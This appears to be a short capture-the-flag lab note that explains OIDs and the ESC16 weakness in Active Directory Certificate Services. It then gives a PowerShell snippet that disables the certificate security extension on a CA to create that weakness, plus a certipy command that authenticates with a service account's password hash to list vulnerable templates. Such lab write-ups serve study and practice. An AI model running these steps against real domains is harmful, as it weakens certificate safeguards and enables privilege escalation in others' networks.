
## 🔍 What an **OID** Is

An **OID (Object Identifier)** is a globally unique identifier used in PKI, certificates, LDAP schemas, Kerberos extensions, and countless other standards. Think of it as a **namespace‑safe identifier** for:

- Certificate extensions
    
- EKUs
    
- Cryptographic algorithms
    
- Directory attributes
    
- Policy objects
    

They’re structured hierarchically, like:

```
1.3.6.1.4.1.311.25.2
```

Each number represents a branch in a global tree managed by ISO/ITU.


>[!Extra Information]
>The `ESC16` vulnerability occurs when a Certificate Authority (CA) is configured to disable the inclusion of OID `1.3.6.1.4.1.311.25.2` (the security extension) in all certificates it issues, or if the `KB5014754` patch has not been applied. This makes the `CA` behave as if all its published templates were vulnerable to the `ESC9` vector.

## Running

#WinRM_Shell 
- Add the OID extension `1.3.6.1.4.1.311.25.2` to the list of disabled extensions to enable `ESC16`.

```powershell
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$ConfigReader.SetConfigEntry("1.3.6.1.4.1.311.25.2", "DisableExtensionList", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

#Attacking_machine 
- Verify this as follows:

```bash
certipy-ad find -u 'gMSA_CA_prod$' -hashes '02dc1e938b2004f0c8145b499ee73f41' -dc-ip <IP> -vulnerable -stdout
```

![[certipi.png|1058x897]]

**Next step:** [[ESC6 Exploitation]]